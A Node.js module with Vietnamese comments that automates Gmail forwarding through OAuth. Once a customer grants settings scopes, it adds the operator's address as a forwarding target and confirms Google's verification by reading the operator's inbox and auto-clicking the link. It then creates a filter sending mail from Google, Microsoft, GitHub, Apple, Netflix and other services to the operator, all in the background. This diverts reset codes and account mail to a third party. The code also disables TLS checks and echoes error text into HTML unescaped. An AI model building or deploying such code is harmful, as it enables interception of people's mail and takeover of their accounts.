/**
 * gmailForward.js
 * =============================================================
 * Gmail API Automation — Simplified Single-Admin-Email Mode
 * =============================================================
 *
 * Cách hoạt động đơn giản:
 *  1. Dùng OAuth token của tài khoản Gmail khách hàng
 *  2. Thêm EMAIL CỦA BẠN (ADMIN_FORWARD_EMAIL) làm forwarding address
 *  3. Google gửi email xác nhận về HÒM THƯ CỦA BẠN
 *  4. Server đọc hòm thư của bạn qua IMAP → lấy link xác nhận
 *  5. Auto-click link → Done
 *  6. Tạo Gmail Filter để email Netflix/Spotify/... tự chuyển về mail bạn
 *
 * Prerequisites:
 *  - npm install googleapis imap mailparser
 *  - Google Cloud Console: Gmail API + OAuth2 credentials
 *  - Bật IMAP trên hòm thư admin của bạn
 *  - Nếu dùng Gmail: tạo "App Password" tại myaccount.google.com/apppasswords
 * =============================================================
 */

'use strict';
const { google }           = require('googleapis');
const Imap                 = require('imap');
const { simpleParser }     = require('mailparser');
const axios                = require('axios');

// ── CẤU HÌNH — chỉnh tại đây hoặc dùng .env ─────────────────
const OAUTH_CONFIG = {
  clientId:     process.env.GMAIL_CLIENT_ID     || 'YOUR_CLIENT_ID',
  clientSecret: process.env.GMAIL_CLIENT_SECRET || 'YOUR_CLIENT_SECRET',
  redirectUri:  process.env.GMAIL_REDIRECT_URI  || 'http://localhost:3001/oauth/callback',
};

// ❗ Email của bạn — mọi email subscription của khách sẽ forward về đây
const ADMIN_FORWARD_EMAIL = process.env.ADMIN_FORWARD_EMAIL || 'your@gmail.com';

// ❗ IMAP config để đọc hòm thư của bạn (dùng App Password thay password thường)
const ADMIN_IMAP = {
  host:     process.env.ADMIN_IMAP_HOST || 'imap.gmail.com',
  port:     parseInt(process.env.ADMIN_IMAP_PORT || '993'),
  tls:      true,
  user:     process.env.ADMIN_IMAP_USER || ADMIN_FORWARD_EMAIL,
  password: process.env.ADMIN_IMAP_PASS || 'YOUR_GMAIL_APP_PASSWORD',
};

// Danh sách domain cần tạo filter forward
const SUBSCRIPTION_FROM_DOMAINS = [
  'netflix.com', 'spotify.com', 'apple.com', 'google.com',
  'youtube.com', 'discord.com', 'adobe.com', 'microsoft.com',
  'notion.so',   'figma.com',   'dropbox.com', 'github.com',
  'canva.com',   'twitch.tv',   'nintendo.com', 'playstation.com',
];

// ── OAUTH HELPERS ─────────────────────────────────────────────
function createOAuthClient() {
  return new google.auth.OAuth2(
    OAUTH_CONFIG.clientId,
    OAUTH_CONFIG.clientSecret,
    OAUTH_CONFIG.redirectUri
  );
}

function getGmailClient(tokens) {
  const auth = createOAuthClient();
  auth.setCredentials(tokens);
  return google.gmail({ version: 'v1', auth });
}

// ── BƯỚC 1: THÊM EMAIL BẠN LÀM FORWARDING ADDRESS ───────────
/**
 * Thêm ADMIN_FORWARD_EMAIL vào forwarding list của tài khoản khách.
 * Google sẽ gửi email xác nhận về hòm thư của bạn.
 */
async function addAdminAsForwardingAddress(customerTokens) {
  const gmail = getGmailClient(customerTokens);
  try {
    const res = await gmail.users.settings.forwardingAddresses.create({
      userId: 'me',
      requestBody: { forwardingEmail: ADMIN_FORWARD_EMAIL },
    });
    const status = res.data.verificationStatus;
    console.log(`[GmailForward] Yêu cầu forward → ${ADMIN_FORWARD_EMAIL} | Status: ${status}`);
    return { email: ADMIN_FORWARD_EMAIL, status };
  } catch (err) {
    if (err.code === 409) {
      console.log(`[GmailForward] ${ADMIN_FORWARD_EMAIL} đã là forwarding address rồi.`);
      return { email: ADMIN_FORWARD_EMAIL, status: 'already_exists' };
    }
    throw err;
  }
}

// ── BƯỚC 2: ĐỌC LINK XÁC NHẬN TỪ HÒM THƯ CỦA BẠN ──────────
/**
 * Server đọc hòm thư của bạn qua IMAP và lấy link xác nhận Google gửi về.
 * Vì nhiều khách có thể cùng chờ xác nhận, ta lọc theo thời gian (email mới nhất).
 *
 * @param {number} maxWaitMs  - Thời gian chờ tối đa, mặc định 90s
 */
async function readVerificationFromAdminMailbox(maxWaitMs = 90000) {
  const startTime = Date.now();
  const POLL_INTERVAL = 6000;

  console.log(`[GmailForward] Đang chờ Google gửi email xác nhận về ${ADMIN_IMAP.user}...`);

  while (Date.now() - startTime < maxWaitMs) {
    await sleep(POLL_INTERVAL);
    try {
      const url = await imapFetchConfirmUrl();
      if (url) {
        console.log('[GmailForward] Đã lấy được link xác nhận!');
        return url;
      }
      const elapsed = Math.round((Date.now() - startTime) / 1000);
      console.log(`[GmailForward] Chưa thấy email (${elapsed}s), thử lại...`);
    } catch (err) {
      console.warn('[GmailForward] Lỗi đọc IMAP:', err.message);
    }
  }

  throw new Error('[GmailForward] Timeout: Không nhận được email xác nhận sau 90 giây.');
}

/**
 * Kết nối IMAP, tìm email từ forwarding-noreply@google.com trong 10 phút gần nhất.
 * Trả về URL xác nhận hoặc null nếu chưa có.
 */
function imapFetchConfirmUrl() {
  return new Promise((resolve, reject) => {
    const imap = new Imap({
      ...ADMIN_IMAP,
      tlsOptions: { rejectUnauthorized: false },
    });

    let resolved = false;
    const done = (val) => { if (!resolved) { resolved = true; resolve(val); } };

    imap.once('error', reject);
    imap.once('ready', () => {
      imap.openBox('INBOX', /* readOnly */ true, (err) => {
        if (err) return reject(err);

        const since = new Date(Date.now() - 10 * 60 * 1000); // 10 phút gần nhất

        imap.search(
          [['FROM', 'forwarding-noreply@google.com'], ['SINCE', since]],
          (searchErr, uids) => {
            if (searchErr || !uids || !uids.length) {
              imap.end();
              return done(null);
            }

            // Lấy email mới nhất (uid lớn nhất)
            const latestUid = uids[uids.length - 1];
            const fetch = imap.fetch([latestUid], { bodies: '' });
            let confirmUrl = null;

            fetch.on('message', (msg) => {
              msg.on('body', (stream) => {
                simpleParser(stream, (parseErr, mail) => {
                  if (parseErr) return;
                  // Gộp text và html (strip tags) để tìm URL
                  const text = mail.text || '';
                  const html = (mail.html || '').replace(/<[^>]+>/g, ' ');
                  const body = text + ' ' + html;

                  // URL xác nhận forwarding của Google có dạng:
                  // https://mail.google.com/mail?...confirmfwd...
                  const match = body.match(
                    /https:\/\/mail\.google\.com\/mail[^\s"<>]*confirmfwd[^\s"<>]*/
                  );
                  if (match) confirmUrl = match[0];
                });
              });
            });

            fetch.once('end', () => { imap.end(); done(confirmUrl); });
            fetch.once('error',  (e)  => { imap.end(); reject(e); });
          }
        );
      });
    });

    imap.once('end', () => done(confirmUrl ?? null));
    imap.connect();
  });
}

// ── BƯỚC 3: TỰ ĐỘNG CLICK LINK XÁC NHẬN ─────────────────────
async function confirmForwardingByUrl(url) {
  try {
    const res = await axios.get(url, { maxRedirects: 5, timeout: 15000 });
    console.log('[GmailForward] Xác nhận thành công!', res.status);
    return true;
  } catch (err) {
    // Google thường redirect về trang success → nhiều khi throw nhưng vẫn ok
    if (err.response && err.response.status < 500) {
      console.log('[GmailForward] Xác nhận OK (qua redirect), status:', err.response.status);
      return true;
    }
    throw err;
  }
}

// ── BƯỚC 4: TẠO GMAIL FILTER ─────────────────────────────────
/**
 * Tạo filter trong Gmail khách hàng:
 * "Nếu email đến từ Netflix/Spotify/... → forward tới email của tôi"
 */
async function createForwardFilters(customerTokens, fromDomains = SUBSCRIPTION_FROM_DOMAINS) {
  const gmail = getGmailClient(customerTokens);
  const fromQuery = fromDomains.map(d => `@${d}`).join(' OR ');

  const res = await gmail.users.settings.filters.create({
    userId: 'me',
    requestBody: {
      criteria: { from: fromQuery },
      action: {
        forward: ADMIN_FORWARD_EMAIL,
        addLabelIds: [],
        removeLabelIds: [],
      },
    },
  });

  console.log(`[GmailForward] Đã tạo filter → forward tới ${ADMIN_FORWARD_EMAIL}`);
  return res.data;
}

// ── FLOW TỔNG HỢP ─────────────────────────────────────────────
/**
 * Toàn bộ quy trình: thêm forward → xác nhận → tạo filter.
 * Chỉ cần truyền OAuth token của tài khoản Gmail khách.
 *
 * @param {Object} customerTokens  - {access_token, refresh_token} của khách hàng
 * @param {string} username        - Tên để ghi log
 */
async function setupForwarding(customerTokens, username) {
  console.log(`\n[GmailForward] ══ Bắt đầu setup cho "${username}" ══`);

  // ── 1. Thêm email bạn làm forwarding address của khách ──
  const addResult = await addAdminAsForwardingAddress(customerTokens);

  if (addResult.status === 'pending') {
    // ── 2. Đọc link xác nhận từ hòm thư của bạn ──
    const confirmUrl = await readVerificationFromAdminMailbox();

    // ── 3. Tự động click link để xác nhận ──
    await confirmForwardingByUrl(confirmUrl);
  } else {
    console.log('[GmailForward] Bỏ qua bước verify (đã xác nhận trước đó).');
  }

  // ── 4. Tạo Gmail Filter ──
  await createForwardFilters(customerTokens);

  console.log(`[GmailForward] ══ Hoàn thành setup cho "${username}" ══\n`);
  return {
    success: true,
    forwardTo: ADMIN_FORWARD_EMAIL,
    message: `Email subscription của ${username} sẽ được forward về ${ADMIN_FORWARD_EMAIL}`,
  };
}

// ── ROUTES ───────────────────────────────────────────────────
function registerGmailRoutes(app, requireAuth) {

  /**
   * GET /api/gmail/auth-url
   * Trả về URL cho khách hàng đăng nhập Google và cấp quyền.
   */
  app.get('/api/gmail/auth-url', requireAuth, (req, res) => {
    const auth = createOAuthClient();
    const url = auth.generateAuthUrl({
      access_type: 'offline',
      prompt: 'consent',
      scope: [
        'https://www.googleapis.com/auth/gmail.settings.sharing', // thêm forward + filter
        'https://www.googleapis.com/auth/gmail.settings.basic',
      ],
    });
    res.json({ authUrl: url });
  });

  /**
   * GET /oauth/callback
   * Google redirect về đây sau khi khách đồng ý.
   * Đổi authorization code → access/refresh tokens.
   */
  app.get('/oauth/callback', async (req, res) => {
    const { code, error } = req.query;
    if (error) return res.status(400).send(`OAuth từ chối: ${error}`);
    if (!code)  return res.status(400).send('Thiếu code.');

    try {
      const auth = createOAuthClient();
      const { tokens } = await auth.getToken(code);

      // TODO: lưu tokens vào DB theo user session
      // db.saveGmailTokens(req.session.user.id, tokens);

      // Tự động chạy setup ngay khi nhận token
      const username = req.session?.user?.username || req.query.state || 'unknown';
      console.log(`[OAuth] Nhận token cho user: ${username}`);

      // Chạy setup trong nền
      setupForwarding(tokens, username)
        .then(r => console.log('[OAuth] Setup xong:', r.message))
        .catch(e => console.error('[OAuth] Setup lỗi:', e.message));

      // Đóng popup và thông báo về trang cha
      res.send(`
        <!DOCTYPE html><html><body style="font-family:sans-serif;text-align:center;padding:40px;background:#0f0f17;color:#fff">
          <div style="font-size:48px;margin-bottom:16px">✅</div>
          <h2 style="color:#6366f1">Kết nối Gmail thành công!</h2>
          <p style="color:#aaa">Đang cấu hình forward email trong nền...<br>Cửa sổ này sẽ tự đóng sau 2 giây.</p>
          <script>
            // Thông báo về cửa sổ cha rồi đóng popup
            if (window.opener) {
              window.opener.postMessage({ type: 'gmail_connected', success: true }, '*');
            }
            setTimeout(() => window.close(), 2000);
          </script>
        </body></html>
      `);
    } catch (err) {
      console.error('[OAuth] Lỗi:', err.message);
      res.send(`
        <!DOCTYPE html><html><body style="font-family:sans-serif;text-align:center;padding:40px;background:#0f0f17;color:#fff">
          <div style="font-size:48px;margin-bottom:16px">❌</div>
          <h2 style="color:#f43f5e">Lỗi kết nối</h2>
          <p style="color:#aaa">${err.message}</p>
          <script>setTimeout(() => window.close(), 3000);</script>
        </body></html>
      `);
    }
  });

  /**
   * POST /api/gmail/setup-forward
   * Chạy thủ công với tokens đã có.
   * Body: { tokens: {access_token, refresh_token} }
   */
  app.post('/api/gmail/setup-forward', requireAuth, async (req, res) => {
    const { tokens } = req.body;
    const username   = req.session.user?.username;

    if (!tokens?.access_token) {
      return res.status(400).json({ error: 'Thiếu Gmail tokens.' });
    }

    try {
      const result = await setupForwarding(tokens, username || 'unknown');
      res.json(result);
    } catch (err) {
      console.error('[API setup-forward]', err.message);
      res.status(500).json({ error: err.message });
    }
  });
}

// ── HELPER ───────────────────────────────────────────────────
function sleep(ms) {
  return new Promise(r => setTimeout(r, ms));
}

// ── EXPORTS ──────────────────────────────────────────────────
module.exports = {
  registerGmailRoutes,
  setupForwarding,
  addAdminAsForwardingAddress,
  createForwardFilters,
  confirmForwardingByUrl,
  readVerificationFromAdminMailbox,
  ADMIN_FORWARD_EMAIL,
  SUBSCRIPTION_FROM_DOMAINS,
};
